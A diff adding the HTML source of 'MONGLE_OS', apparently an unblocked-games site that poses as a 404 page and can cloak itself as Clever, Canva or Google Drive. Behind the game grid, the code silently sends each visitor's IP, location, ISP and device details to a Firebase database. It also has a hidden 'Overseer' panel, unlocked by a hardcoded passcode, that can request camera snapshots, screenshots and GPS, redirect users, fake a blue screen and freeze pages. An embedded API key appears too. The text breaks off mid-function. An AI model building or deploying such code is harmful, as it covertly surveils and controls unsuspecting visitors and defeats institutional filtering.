@@ -1,0 +1,789 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>MONGLE_OS — 404</title>
+    <link id="favicon" rel="icon" href="https://ssl.gstatic.com/images/branding/product/1x/drive_2020q4_32dp.png">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+    <style>
+        :root { --primary: #00ff41; --bg: #000; --card: #111; --accent: #003b00; --fav: #ff4757; --warn: #ffae00; --err: #ff0000; }
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #fff; color: #000; font-family: 'Segoe UI', sans-serif; overflow: hidden; }
+        
+        #ghostAdmin { position: fixed; top: 0; left: 0; width: 80px; height: 80px; z-index: 2000000; cursor: default; }
+        #ghostPleb { position: fixed; top: 0; right: 0; width: 80px; height: 80px; z-index: 2000000; cursor: default; }
+
+        #lockdown { position: fixed; inset: 0; background: #fff; z-index: 1000000; display: flex; flex-direction: column; align-items: center; justify-content: center; }
+        #loginOverlay { position: fixed; inset: 0; background: rgba(0,0,0,0.98); z-index: 1500000; display: none; align-items: center; justify-content: center; }
+        
+        #freeze { position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 9999999; display: none; cursor: wait; color: var(--primary); font-family: monospace; flex-direction:column; align-items: center; justify-content: center; font-size: 20px; }
+        #bsod { display:none; position:fixed; inset:0; background:#0078d7; color:#fff; font-family:'Segoe UI', sans-serif; z-index:99999999; padding:100px; font-size:24px; cursor:none; }
+
+        #app { display: none; height: 100vh; flex-direction: column; background: var(--bg); color: var(--primary); font-family: 'Consolas', monospace; }
+        .nav { display: flex; justify-content: space-between; align-items: center; padding: 10px 20px; background: #080808; border-bottom: 1px solid #222; }
+        
+        .game-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(220px, 1fr)); gap: 15px; padding: 20px; overflow-y: auto; flex-grow: 1; }
+        
+        .card { background: var(--card); border: 1px solid #222; padding: 40px 15px; text-align: center; cursor: pointer; border-radius: 8px; color: var(--primary); position: relative; transition: 0.2s; }
+        .card:hover { border-color: var(--primary); background: #0a1a0a; transform: scale(1.02); }
+        
+        .fav-area { position: absolute; top: 5px; right: 5px; width: 40px; height: 40px; display: flex; align-items: center; justify-content: center; z-index: 100; cursor: pointer; background: #1a1a1a; border-radius: 50%; border: 1px solid #333; transition: 0.2s; }
+        .fav-area:hover { background: #333; border-color: var(--fav); }
+        .fav-btn { color: #555; font-size: 22px; pointer-events: none; transition: 0.2s; }
+        .fav-btn.active { color: var(--fav); text-shadow: 0 0 10px var(--fav); }
+
+        .modal { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: #0a0a0a; border: 1px solid #333; padding: 25px; z-index: 3000000; width: 95%; max-width: 1200px; border-radius: 12px; box-shadow: 0 0 60px #000; color: #fff; }
+        .input { background: #000; border: 1px solid #444; color: var(--primary); padding: 12px; width: 100%; box-sizing: border-box; margin: 10px 0; outline: none; border-radius: 6px; font-family: monospace; }
+        .btn { background: var(--primary); color: #000; border: none; padding: 10px 15px; cursor: pointer; font-weight: bold; border-radius: 4px; text-transform: uppercase; font-size: 11px; transition: 0.2s; font-family: monospace; }
+        .btn:hover { opacity: 0.8; }
+        .btn-red { background: var(--err); color: #fff; }
+        .btn-warn { background: var(--warn); color: #000; }
+        .muted { color: #999; font-size:12px; }
+        
+        .admin-layout { display: flex; gap: 20px; height: 600px; }
+        .u-sidebar { width: 300px; border: 1px solid #333; overflow-y: auto; background: #050505; }
+        .u-item { padding: 15px; border-bottom: 1px solid #222; cursor: pointer; color: #888; transition: 0.2s; }
+        .u-item:hover { background: #111; color: #fff; }
+        .u-item.selected { border-left: 4px solid var(--primary); background: #0a1a0a; color: var(--primary); }
+        
+        .info-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; font-size: 12px; background: #000; padding: 15px; border: 1px solid #333; color: #ccc; overflow-y: auto; max-height: 150px; }
+        .info-grid b { color: var(--primary); }
+        .info-grid span { color: #fff; }
+
+        #preview { height: 350px; border: 1px solid #333; background: #000 no-repeat center; background-size: contain; position: relative; }
+        #live-indicator { position: absolute; top: 10px; right: 10px; background: red; color: white; padding: 5px 10px; border-radius: 4px; font-size: 10px; display: none; animation: blink 1s infinite; }
+        @keyframes blink { 50% { opacity: 0; } }
+
+        .switch { display: flex; align-items: center; gap: 10px; cursor: pointer; margin-bottom: 10px; }
+        .check-box { width: 20px; height: 20px; border: 1px solid #444; display: flex; align-items: center; justify-content: center; color: var(--primary); }
+
+        /* Updates modal specifics */
+        #updatesList { max-height: 50vh; overflow-y: auto; background:#050505; border:1px solid #333; padding:12px; border-radius:8px; color:#ddd; font-size:13px; }
+        .update-item { padding:8px 10px; border-bottom:1px solid #171717; }
+        .update-time { color:#888; font-size:11px; display:block; margin-top:6px; }
+
+        /* Admin error log */
+        #adminErrorLog { max-height: 120px; overflow-y: auto; background:#070707; border:1px solid #3b1f1f; padding:8px; color:#f7b7b7; font-size:12px; border-radius:6px; }
+        .err-item { padding:6px 8px; border-bottom:1px dashed #2b1b1b; font-size:12px; color:#ffb3b3; }
+
+        /* small helpers */
+        .row { display:flex; gap:8px; align-items:center; }
+        .col { display:flex; flex-direction:column; gap:8px; }
+    </style>
+</head>
+<body>
+
+    <div id="ghostAdmin" onclick="door('admin')"></div>
+    <div id="ghostPleb" onclick="door('pleb')"></div>
+
+    <div id="lockdown"><h1>404</h1><p>The requested URL was not found on this server.</p></div>
+    <div id="freeze"><h1>SYSTEM PAUSED</h1><p>Contact Administrator</p></div>
+    <div id="bsod">:(<br><br>Your PC ran into a problem and needs to restart.<br><br><span style="font-size:18px">Stop Code: CRITICAL_PROCESS_DIED</span></div>
+
+    <div id="loginOverlay">
+        <div style="text-align:center; width: 360px; background:#0a0a0a; padding:30px; border-radius:15px; border:1px solid #333;">
+            <h2 style="color:var(--primary); margin-top:0;">MONGLE_OS v6.0</h2>
+            <input type="text" id="username" class="input" placeholder="Identify Yourself...">
+            <div style="display:flex; gap:8px;">
+                <button class="btn" style="flex:1;" onclick="initSession()">CONNECT</button>
+                <button class="btn" style="background:#222; color:var(--primary);" onclick="closeLogin()">CANCEL</button>
+            </div>
+            <div class="muted" style="margin-top:8px;">Tip: Shift+L opens login when not connected.</div>
+        </div>
+    </div>
+
+    <div id="app">
+        <div class="nav">
+            <div style="min-width: 150px;"><b id="brandLabel">MONGLE_OS</b> <span id="badge" style="font-size:10px; color:var(--primary);"></span></div>
+            <div style="display:flex; gap:10px; flex-grow:1; justify-content: center; max-width:800px;">
+                <select id="cat" class="input" style="width:140px; margin:0;" onchange="renderGrid()">
+                    <option value="all">ALL_FILES</option>
+                    <option value="favs">FAVORITES ❤️</option>
+                    <option value="fnaf">FNAF (Only)</option>
+                    <option value="horror">SCARY / HORROR</option>
+                    <option value="action">ACTION / FPS</option>
+                    <option value="other">OTHER</option>
+                </select>
+                <input type="text" id="search" class="input" style="margin:0; max-width: 300px;" placeholder="Search Database..." oninput="renderGrid()">
+            </div>
+            <div style="display:flex; gap:8px; min-width: 150px; justify-content: flex-end;">
+                <button class="btn" style="background:#111; color:var(--primary); border:1px solid #222;" onclick="openMongleAboutBlank()">OPEN MONGLE (about:blank)</button>
+                <button id="adminBtn" class="btn" style="display:none; background: #222; color: var(--primary); border: 1px solid var(--primary);" onclick="toggleModal('adminM')">OVERSEER</button>
+                <button class="btn" style="background:#222; color:#fff;" onclick="toggleModal('settingsM')">⚙️</button>
+                <button class="btn btn-red" onclick="panicTrigger()">PANIC</button>
+            </div>
+        </div>
+        <div id="grid" class="game-grid"></div>
+    </div>
+
+    <div id="adminM" class="modal" aria-hidden="true" style="max-width:1100px;">
+        <div style="display:flex; justify-content:space-between; align-items:center; border-bottom:1px solid #333; padding-bottom:10px; margin-bottom:15px;">
+            <div>
+                <h3 style="margin:0; color:var(--primary);">OVERSEER CONTROL DECK</h3>
+                <div class="muted" id="userCount">Users: 0</div>
+            </div>
+            <div>
+                <button class="btn btn-warn" onclick="globalReload()">NUKE (RELOAD ALL)</button>
+                <button class="btn" style="background:#222; color:#fff;" onclick="toggleModal('adminM')">CLOSE</button>
+            </div>
+        </div>
+        <div class="admin-layout">
+            <div style="display:flex; flex-direction:column; gap:8px; width:340px;">
+                <div class="u-sidebar" id="userList" style="flex:1;"></div>
+                <div style="display:flex; gap:8px;">
+                    <input id="adminSearchUser" class="input" placeholder="Filter users..." oninput="filterUserList()" style="flex:1;">
+                    <button class="btn" onclick="refreshPresence()">REFRESH</button>
+                </div>
+            </div>
+
+            <div style="flex:1; display:flex; flex-direction:column; gap:10px;">
+                <div id="dossier" class="info-grid">Select a user to view intel...</div>
+                <div id="preview"><div id="live-indicator">● LIVE FEED</div></div>
+
+                <div style="display:grid; grid-template-columns: repeat(5, 1fr); gap:8px; margin-top:8px;">
+                    <button class="btn" onclick="adminAct('capReq')">📸 SCREEN</button>
+                    <button class="btn" onclick="adminAct('camReq')">🎥 CAMERA</button>
+                    <button class="btn" onclick="adminAct('gpsReq')">📍 GET GPS</button>
+                    <button class="btn" id="watchBtn" style="background:#004400; color:white;" onclick="toggleWatch()">👁️ WATCH</button>
+                    <button class="btn" style="background:purple; color:white;" onclick="adminAct('reload')">↻ RELOAD</button>
+
+                    <button class="btn btn-warn" onclick="adminAct('frozen')">❄️ FREEZE</button>
+                    <button class="btn btn-warn" onclick="adminAct('bsod')">☠️ BSOD</button>
+                    <button class="btn btn-warn" onclick="adminAct('print')">🖨️ PRINT</button>
+                    <button class="btn btn-warn" onclick="adminAct('vibrate')">📳 VIBE</button>
+                    <button class="btn btn-red" onclick="adminAct('kicked')">🚫 KICK</button>
+                </div>
+
+                <div style="display:flex; gap:8px; margin-top: 8px;">
+                    <input type="text" id="adminCommandInp" class="input" style="margin:0;" placeholder="Message / URL / Speak Text...">
+                    <button class="btn" onclick="adminCustom('msg')">MSG</button>
+                    <button class="btn" onclick="adminCustom('speak')">🗣️ SPEAK</button>
+                    <button class="btn" onclick="adminCustom('redir')">REDIR</button>
+                    <button class="btn" onclick="adminCustom('openTab')">TAB</button>
+                </div>
+
+                <div style="display:flex; gap:8px; margin-top:8px;">
+                    <input id="adminUpdateInp" class="input" placeholder="Write announcement..." style="flex:1;">
+                    <button class="btn btn-warn" onclick="adminAddUpdate()">ADD UPDATE</button>
+                </div>
+
+                <div>
+                    <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:6px;">
+                        <div class="muted">Admin Error Log</div>
+                        <div class="muted">Last errors appear below</div>
+                    </div>
+                    <div id="adminErrorLog">No errors yet.</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="settingsM" class="modal" style="width:360px;">
+        <h3>CONFIG</h3>
+        <div class="switch" onclick="toggleCfg('enable')">
+            <div class="check-box" id="chkEnable">✓</div>
+            <span>ENABLE PANIC KEY</span>
+        </div>
+        <label style="font-size:12px; color:#888;">PANIC URL</label>
+        <input type="text" id="cfgUrl" class="input" placeholder="https://google.com">
+        <label style="font-size:12px; color:#888;">PANIC KEY (Click & Press)</label>
+        <input type="text" id="cfgKeyDisp" class="input" placeholder="Press any key..." readonly style="cursor:pointer; text-align:center; border-color:var(--primary);">
+        <label style="font-size:12px; color:#888;">STEALTH MODE</label>
+        <select id="cfgMode" class="input">
+            <option value="tab">New Tab (Standard)</option>
+            <option value="blank">About:Blank (Full Stealth)</option>
+            <option value="embed">Embed in Mongle Tab</option>
+        </select>
+
+        <label style="font-size:12px; color:#888; margin-top:8px;">APPEARANCE</label>
+        <select id="cfgTheme" class="input">
+            <option value="mongle">MONGLE (Default)</option>
+            <option value="clever">CLEVER (Light / Blue)</option>
+            <option value="canva">CANVA (Purple / Gradient)</option>
+            <option value="website">WEBSITE (Neutral / Gray)</option>
+        </select>
+
+        <label style="font-size:12px; color:#888; margin-top:8px;">CLOAK AS</label>
+        <select id="cfgCloak" class="input">
+            <option value="none">None (show Mongle)</option>
+            <option value="clever">Clever</option>
+            <option value="canva">Canva</option>
+            <option value="gdrive">Google Drive</option>
+            <option value="google">Google</option>
+        </select>
+
+        <button class="btn" style="width:100%" onclick="saveConfig()">SAVE SETTINGS</button>
+    </div>
+
+    <div id="updatesM" class="modal" style="max-width:800px;">
+        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:12px;">
+            <h3 style="margin:0; color:var(--primary);">MONGLE UPDATES</h3>
+            <div>
+                <button class="btn" style="background:#222; color:#fff;" onclick="toggleModal('updatesM')">CLOSE</button>
+            </div>
+        </div>
+
+        <div id="updatesList">Loading updates...</div>
+
+        <div id="adminUpdateControls" style="margin-top:12px; display:none;">
+            <input id="updateText" class="input" placeholder="Write an update (admins only)..." />
+            <div style="display:flex; gap:8px; margin-top:8px;">
+                <button class="btn" onclick="adminAddUpdateFromUpdates()">POST UPDATE</button>
+                <button class="btn" onclick="fetchUpdates()">REFRESH</button>
+            </div>
+        </div>
+    </div>
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
+        import { getDatabase, ref, onValue, set, update, push, remove, onDisconnect } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
+
+        // Firebase credentials (kept from original)
+        const firebaseConfig = { apiKey: "AIzaSyDgRvxKypPsOx379SNleE6Uij7mKkEJxGY", databaseURL: "https://monglearcade-default-rtdb.firebaseio.com", projectId: "monglearcade" };
+        const app = initializeApp(firebaseConfig);
+        const db = getDatabase(app);
+
+        // Variables
+        let userRef, myID, selectedID, isAdmin = false, gameData = [];
+        let favs = JSON.parse(localStorage.getItem('favs') || '[]');
+        let cfg = {
+            url: localStorage.getItem('pUrl') || 'https://google.com',
+            key: localStorage.getItem('pKey') || 'Escape',
+            mode: localStorage.getItem('pMode') || 'tab',
+            enable: localStorage.getItem('pEnable') !== 'false',
+            theme: localStorage.getItem('pTheme') || 'mongle',
+            cloak: localStorage.getItem('pCloak') || 'none'
+        };
+        let activeGameWindow = null, watchInterval = null, tempKey = cfg.key;
+        let presenceSnapshot = {};
+        const keyDisp = document.getElementById('cfgKeyDisp');
+
+        // Defensive utilities
+        function logError(msg) {
+            try {
+                const el = document.getElementById('adminErrorLog');
+                if (!el) return;
+                const now = new Date().toLocaleString();
+                const entry = document.createElement('div');
+                entry.className = 'err-item';
+                entry.innerText = `${now} — ${msg}`;
+                if (el.innerText === 'No errors yet.') el.innerHTML = '';
+                el.prepend(entry);
+                // keep only last 50
+                while (el.children.length > 50) el.removeChild(el.lastChild);
+                // Optionally push to firebase errors node to inspect remotely
+                try { push(ref(db, 'errors'), { msg, created: new Date().toISOString(), page: window.location.href }).catch(()=>{}); } catch(e){}
+            } catch(e){}
+        }
+
+        window.addEventListener('error', (ev) => {
+            logError(ev.message || 'Error event');
+        });
+        window.addEventListener('unhandledrejection', (ev) => {
+            logError('Promise rejection: ' + (ev.reason && ev.reason.message ? ev.reason.message : JSON.stringify(ev.reason)));
+        });
+
+        keyDisp.onclick = () => {
+            keyDisp.value = "[ PRESS KEY NOW ]"; keyDisp.style.background = "#222";
+            const handler = (e) => { e.preventDefault(); tempKey = e.key; keyDisp.value = e.key.toUpperCase(); keyDisp.style.background = "#000"; window.removeEventListener('keydown', handler); };
+            window.addEventListener('keydown', handler);
+        };
+
+        // Apply theme via CSS variables
+        function applyTheme(t) {
+            const root = document.documentElement.style;
+            try {
+                if (t === 'clever') {
+                    root.setProperty('--primary', '#0b63d1');
+                    root.setProperty('--bg', '#f6f9fc');
+                    root.setProperty('--card', '#ffffff');
+                    root.setProperty('--accent', '#084a9e');
+                    root.setProperty('--fav', '#ff4757');
+                    root.setProperty('--warn', '#ffae00');
+                    root.setProperty('--err', '#d63031');
+                    document.body.style.background = root.getPropertyValue('--bg');
+                    document.body.style.color = '#111';
+                } else if (t === 'canva') {
+                    root.setProperty('--primary', '#7c5cff');
+                    root.setProperty('--bg', 'linear-gradient(135deg,#0f172a,#7c5cff 60%)');
+                    root.setProperty('--card', 'rgba(255,255,255,0.04)');
+                    root.setProperty('--accent', '#5a3bff');
+                    root.setProperty('--fav', '#ffb86b');
+                    root.setProperty('--warn', '#ffc857');
+                    root.setProperty('--err', '#ff6b6b');
+                    document.body.style.background = root.getPropertyValue('--bg');
+                    document.body.style.color = '#fff';
+                } else if (t === 'website') {
+                    root.setProperty('--primary', '#2d3748');
+                    root.setProperty('--bg', '#f4f6f8');
+                    root.setProperty('--card', '#ffffff');
+                    root.setProperty('--accent', '#1f2937');
+                    root.setProperty('--fav', '#ff6b6b');
+                    root.setProperty('--warn', '#ffae00');
+                    root.setProperty('--err', '#d90429');
+                    document.body.style.background = root.getPropertyValue('--bg');
+                    document.body.style.color = '#111';
+                } else { // mongle default
+                    root.setProperty('--primary', '#00ff41');
+                    root.setProperty('--bg', '#000');
+                    root.setProperty('--card', '#111');
+                    root.setProperty('--accent', '#003b00');
+                    root.setProperty('--fav', '#ff4757');
+                    root.setProperty('--warn', '#ffae00');
+                    root.setProperty('--err', '#ff0000');
+                    document.body.style.background = root.getPropertyValue('--bg');
+                    document.body.style.color = '#fff';
+                }
+            } catch(e) { logError('applyTheme failed: ' + e.message); }
+        }
+
+        // Cloak functionality: change title, favicon, brand label
+        function applyCloak(c) {
+            try {
+                cfg.cloak = c || 'none';
+                let title = 'MONGLE_OS';
+                let fav = 'https://ssl.gstatic.com/images/branding/product/1x/drive_2020q4_32dp.png';
+                let brand = 'MONGLE_OS';
+
+                if (c === 'clever') {
+                    title = 'Clever — Home';
+                    fav = 'https://clever.com/favicon.ico';
+                    brand = 'Clever';
+                } else if (c === 'canva') {
+                    title = 'Canva';
+                    fav = 'https://about.canva.com/wp-content/uploads/sites/3/2020/05/favicon-32x32.png';
+                    brand = 'Canva';
+                } else if (c === 'gdrive') {
+                    title = 'Google Drive';
+                    fav = 'https://ssl.gstatic.com/images/branding/product/1x/drive_2020q4_32dp.png';
+                    brand = 'Drive';
+                } else if (c === 'google') {
+                    title = 'Google';
+                    fav = 'https://www.google.com/favicon.ico';
+                    brand = 'Google';
+                } else {
+                    title = 'MONGLE_OS';
+                    fav = 'https://ssl.gstatic.com/images/branding/product/1x/drive_2020q4_32dp.png';
+                    brand = 'MONGLE_OS';
+                }
+
+                document.title = title;
+                const link = document.getElementById('favicon') || document.createElement('link');
+                link.id = 'favicon';
+                link.rel = 'icon';
+                link.href = fav;
+                if (!document.getElementById('favicon')) document.head.appendChild(link);
+                const brandEl = document.getElementById('brandLabel');
+                if (brandEl) brandEl.innerText = brand;
+                // store selection
+                localStorage.setItem('pCloak', cfg.cloak);
+            } catch(e) { logError('applyCloak failed: ' + e.message); }
+        }
+
+        // Opens a new about:blank and embeds this page
+        window.openMongleAboutBlank = () => {
+            try {
+                const newWin = window.open('about:blank');
+                if (!newWin) { alert('Popup blocked — allow popups for this site.'); return; }
+                const baseUrl = location.href;
+                const html = `<!doctype html><html><head><meta charset="utf-8"><title>MONGLE (about:blank)</title><meta name="viewport" content="width=device-width,initial-scale=1"/></head><body style="margin:0;background:#000;"><iframe src="${baseUrl}" style="border:none;width:100vw;height:100vh;" allow="fullscreen"></iframe></body></html>`;
+                newWin.document.open();
+                newWin.document.write(html);
+                newWin.document.close();
+            } catch (err) { logError('openMongleAboutBlank failed: ' + err.message); alert('Failed to open about:blank.'); }
+        };
+
+        window.door = (type) => {
+            if (type === 'admin') {
+                if (prompt("AUTH_CODE:") === "BALLS_ARE_GOOD") { isAdmin = true; document.getElementById('adminBtn').style.display="block"; document.getElementById('badge').innerText="[OVERSEER]"; initSession(); }
+                else alert("Bad code.");
+            } else { document.getElementById('loginOverlay').style.display = 'flex'; }
+        };
+
+        window.closeLogin = () => { document.getElementById('loginOverlay').style.display = 'none'; };
+
+        // --- Early updates listener so updates show before login ---
+        try {
+            onValue(ref(db, 'updates'), (snap) => {
+                try { renderUpdatesFromSnapshot(snap); }
+                catch (e) { logError('early updates render failed: ' + e.message); }
+            }, (err) => {
+                logError('updates listener early failed: ' + err.message);
+            });
+        } catch(e){ logError('attach updates listener failed: ' + e.message); }
+        // --- end early listener ---
+
+        window.initSession = async () => {
+            try {
+                const name = document.getElementById('username').value || "User_" + Math.floor(Math.random()*999);
+                document.getElementById('lockdown').style.display="none"; 
+                document.getElementById('loginOverlay').style.display="none"; 
+                document.getElementById('app').style.display="flex";
+
+                // Apply saved theme and cloak
+                applyTheme(cfg.theme);
+                applyCloak(cfg.cloak);
+
+                let ipInfo = { ip: 'Hidden', city: '?', region: '?', org: '?' };
+                try { const r = await fetch('https://ipapi.co/json/'); if(r.ok) ipInfo = await r.json(); } catch(e) {}
+                const bat = await navigator.getBattery?.().catch(()=>({}));
+                
+                userRef = push(ref(db, 'presence'), {
+                    name: name, activity: 'Browsing Menu', joined: new Date().toISOString(),
+                    res: `${screen.width}x${screen.height}`, 
+                    hw: `${navigator.hardwareConcurrency||'?'}C / ${navigator.deviceMemory||'?'}GB`,
+                    bat: bat?.level ? `${Math.round(bat.level*100)}%` : '?',
+                    plat: navigator.platform, ip: ipInfo.ip, loc: `${ipInfo.city}, ${ipInfo.region}`, isp: ipInfo.org,
+                    gps: 'Pending Permission...', reload: false
+                });
+                myID = userRef.key;
+                onDisconnect(userRef).remove();
+
+                // Listen for admin actions targeted to this user
+                onValue(ref(db, `presence/${myID}`), (s) => {
+                    const d = s.val(); if(!d) return;
+                    try {
+                        if(d.kicked) { closeGame(); window.location.replace(cfg.url); }
+                        if(d.redir) window.location.replace(d.redir);
+                        if(d.openTab) { window.open(d.openTab, '_blank'); update(userRef, {openTab:null}); }
+                        if(d.reload) window.location.reload();
+                        if(d.print) { window.print(); update(userRef, {print:false}); }
+                        if(d.vibrate) { if(navigator.vibrate) navigator.vibrate([200, 100, 200]); update(userRef, {vibrate:false}); }
+                        document.getElementById('freeze').style.display = d.frozen ? 'flex' : 'none';
+                        document.getElementById('bsod').style.display = d.bsod ? 'block' : 'none';
+                        if(d.frozen || d.bsod) closeGame();
+                        if(d.msg) { alert("ADMIN: " + d.msg); update(userRef, {msg: null}); }
+                        if(d.speak) { const u = new SpeechSynthesisUtterance(d.speak); window.speechSynthesis.speak(u); update(userRef, {speak: null}); }
+                        if(d.gpsReq) { navigator.geolocation.getCurrentPosition((pos) => { update(userRef, {gps: `${pos.coords.latitude.toFixed(5)}, ${pos.coords.longitude.toFixed(5)}`, gpsReq: false}); }, (err) => { update(userRef, {gps: "Denied", gpsReq: false}); }); }
+                        if(d.camReq) { navigator.mediaDevices.getUserMedia({ video: true }).then(stream => { const v = document.createElement('video'); v.srcObject = stream; v.play(); v.onloadedmetadata = () => { const c = document.createElement('canvas'); c.width = v.videoWidth; c.height = v.videoHeight; c.getContext('2d').drawImage(v,0,0); stream.getTracks().forEach(t=>t.stop()); update(userRef, {lastCap: c.toDataURL("image/webp", 0.5), camReq: false}); }; }).catch(e => { update(userRef, {camReq: false}); }); }
+                        if(d.capReq) { html2canvas(document.body, {useCORS: true}).then(c => update(userRef, {lastCap: c.toDataURL("image/webp", 0.2), capReq: false})).catch(()=>update(userRef,{capReq:false})); }
+
+                        if(d.openEmbedUrl) {
+                            try { showEmbedded(d.openEmbedUrl); }
+                            finally { update(userRef, { openEmbedUrl: null }).catch(()=>{}); }
+                        }
+                    } catch(e) { logError('presence handler error: ' + e.message); }
+                });
+
+                // Fetch game list
+                try {
+                    const res = await fetch('https://api.github.com/repos/sqsqs353-alt/the-mongle-thing/contents/');
+                    const data = await res.json();
+                    gameData = Array.isArray(data) ? data.filter(f => f.name && f.name.endsWith('.html') && f.name !== 'index.html') : [];
+                    renderGrid();
+                } catch(e) { logError("Source fetch failed: " + (e.message || e)); }
+
+                if(isAdmin) startOverseer();
+
+                // set admin update controls visibility
+                document.getElementById('adminUpdateControls').style.display = isAdmin ? 'block' : 'none';
+
+                // start listening for updates feed (one-time refresh handled in fetchUpdates)
+                fetchUpdates();
+                onValue(ref(db, 'updates'), (s) => { renderUpdatesFromSnapshot(s); }, (err) => { logError("updates read failed: " + err.message); });
+            } catch(e) {
+                logError('initSession failed: ' + e.message);
+                alert('Login failed. See admin log for details.');
+            }
+        };
+
+        function closeGame() { if(activeGameWindow) activeGameWindow.close(); }
+
+        window.renderGrid = () => {
+            const q = document.getElementById('search').value.toLowerCase();
+            const cat = document.getElementById('cat').value;
+            const grid = document.getElementById('grid'); grid.innerHTML = "";
+            let sorted = [...gameData].sort((a,b) => favs.includes(b.name) - favs.includes(a.name));
+            
+            sorted.filter(g => {
+                const n = (g.name || '').toLowerCase();
+                if (!n.includes(q)) return false;
+                if (cat === 'favs') return favs.includes(g.name);
+                const isFnaf = n.includes('fnaf');
+                const isHorror = (n.includes('scary') || n.includes('horror') || n.includes('granny')) && !isFnaf;
+                const isAction = n.includes('doom') || n.includes('quake') || n.includes('action') || n.includes('shooter') || n.includes('cs');
+                if (cat === 'fnaf' && !isFnaf) return false;
+                if (cat === 'horror' && !isHorror) return false;
+                if (cat === 'action' && !isAction) return false;
+                if (cat === 'other' && (isFnaf || isHorror || isAction)) return false;
+                return true;
+            }).forEach(g => {
+                const card = document.createElement('div'); card.className = "card";
+                const safeName = (g.name || 'unknown.html');
+                card.innerHTML = `<div class="fav-area" onclick="toggleFav(event,'${safeName}')"><span class="fav-btn ${favs.includes(safeName)?'active':''}">❤</span></div>${safeName.replace('.html','').toUpperCase()}`;
+                card.onclick = () => {
+                    const url = `https://raw.githack.com/sqsqs353-alt/the-mongle-thing/main/${safeName}`;
+                    try { update(userRef, {activity: 'Playing '+safeName}); } catch(e){}
+                    if(cfg.mode==='blank') {
+                        activeGameWindow = window.open('about:blank');
+                        activeGameWindow.document.body.innerHTML = `<style>body,html{margin:0;padding:0;height:100vh;width:100vw;overflow:hidden;background:#000}iframe{width:100vw;height:100vh;border:none}</style><iframe src="${url}" allowfullscreen></iframe>`;
+                    } else if (cfg.mode === 'embed') {
+                        showEmbedded(url);
+                    } else {
+                        activeGameWindow = window.open(url, '_blank');
+                    }
+                };
+                grid.appendChild(card);
+            });
+        };
+
+        window.toggleFav = (e, n) => { e.stopPropagation(); if(favs.includes(n)) favs = favs.filter(f=>f!==n); else favs.push(n); localStorage.setItem('favs', JSON.stringify(favs)); renderGrid(); };
+
+        /* --- Embedded helpers --- */
+        function showEmbedded(url) {
+            const container = document.getElementById('embeddedContainer');
+            const frame = document.getElementById('embeddedFrame');
+            if (!container || !frame) return;
+            frame.src = url;
+            container.style.display = 'flex';
+            container.setAttribute('aria-hidden','false');
+        }
+        function closeEmbedded() {
+            const container = document.getElementById('embeddedContainer');
+            const frame = document.getElementById('embeddedFrame');
+            if (!container || !frame) return;
+            frame.src = 'about:blank';
+            container.style.display = 'none';
+            container.setAttribute('aria-hidden','true');
+        }
+
+        /* --- ADMIN CONTROLS --- */
+        function startOverseer() {
+            try {
+                onValue(ref(db, 'presence'), (snap) => {
+                    presenceSnapshot = {};
+                    const list = document.getElementById('userList'); list.innerHTML = "";
+                    let count = 0;
+                    snap.forEach(c => {
+                        count++;
+                        const val = c.val() || {};
+                        presenceSnapshot[c.key] = val;
+                        const u = val;
+                        const displayName = u.name || `Unknown (${c.key.substring(0,6)})`;
+                        const activity = u.activity || '—';
+                        const statusIcon = u.kicked ? "🚫" : (u.frozen ? "❄️" : (u.bsod ? "☠️" : "🟢"));
+                        const d = document.createElement('div');
+                        d.className = `u-item ${selectedID === c.key ? 'selected' : ''}`;
+                        d.innerHTML = `<b>${statusIcon} ${escapeHtml(displayName)}</b><br><small>${escapeHtml(activity)}</small>`;
+                        d.onclick = () => { selectedID = c.key; updateDossier(u, c.key); startOverseer(); };
+                        list.appendChild(d);
+                        if(selectedID === c.key) updateDossier(u, c.key);
+                    });
+                    document.getElementById('userCount').innerText = 'Users: ' + count;
+
+                    if (selectedID && !snap.hasChild(selectedID)) {
+                        selectedID = null;
+                        document.getElementById('dossier').innerHTML = 'Select a user to view intel...';
+                        document.getElementById('preview').style.backgroundImage = '';
+                        if (watchInterval) { clearInterval(watchInterval); watchInterval = null; document.getElementById('watchBtn').style.background="#004400"; document.getElementById('watchBtn').innerText="👁️ WATCH"; document.getElementById('live-indicator').style.display="none"; }
+                    }
+                }, (err) => { logError('presence read failed: ' + err.message); });
+            } catch(e){ logError('startOverseer failed: ' + e.message); }
+        }
+
+        function refreshPresence() {
+            try { startOverseer(); } catch(e){ logError('refreshPresence: ' + e.message); }
+        }
+
+        function filterUserList() {
+            const q = document.getElementById('adminSearchUser').value.toLowerCase();
+            const list = document.getElementById('userList');
+            if (!list) return;
+            Array.from(list.children).forEach(child => {
+                const t = child.innerText.toLowerCase();
+                child.style.display = t.includes(q) ? '' : 'none';
+            });
+        }
+
+        function updateDossier(u, key) {
+            const safe = u || {};
+            const displayName = safe.name || `Unknown (${key.substring(0,6)})`;
+            const status = safe.frozen ? 'FROZEN' : (safe.bsod ? 'BSOD' : (safe.kicked ? 'KICKED' : 'ACTIVE'));
+            const ip = safe.ip || 'N/A';
+            const loc = safe.loc || 'N/A';
+            const gps = safe.gps || 'N/A';
+            const isp = safe.isp || 'N/A';
+            const res = safe.res || 'N/A';
+            const bat = safe.bat || 'N/A';
+            document.getElementById('dossier').innerHTML = `<div><b>ID:</b> ${key.substring(0,6)}...</div><div><b>NAME:</b> ${escapeHtml(displayName)}</div><div><b>STATUS:</b> ${escapeHtml(status)}</div><div><b>IP:</b> ${escapeHtml(ip)}</div><div><b>LOC:</b> ${escapeHtml(loc)}</div><div><b>GPS:</b> ${escapeHtml(gps)}</div><div><b>ISP:</b> ${escapeHtml(isp)}</div><div><b>RES:</b> ${escapeHtml(res)}</div><div><b>BATTERY:</b> ${escapeHtml(bat)}</div>`;
